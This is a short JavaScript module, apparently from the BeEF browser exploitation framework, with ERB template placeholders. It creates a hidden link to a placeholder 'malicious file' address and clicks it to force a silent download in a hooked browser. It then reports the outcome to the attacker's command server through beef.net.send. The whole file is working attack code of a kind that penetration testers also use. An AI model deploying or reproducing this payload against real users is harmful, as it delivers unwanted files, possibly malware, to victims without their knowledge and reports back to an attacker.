beef.execute(function() {
    var maliciousurl = '<%= @malicious_file_uri %>';

    // Trigger the file download silently
    var a = document.createElement('a');
    a.href = maliciousurl;
    a.download = '';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Malicious download triggered for: " + maliciousurl);
});
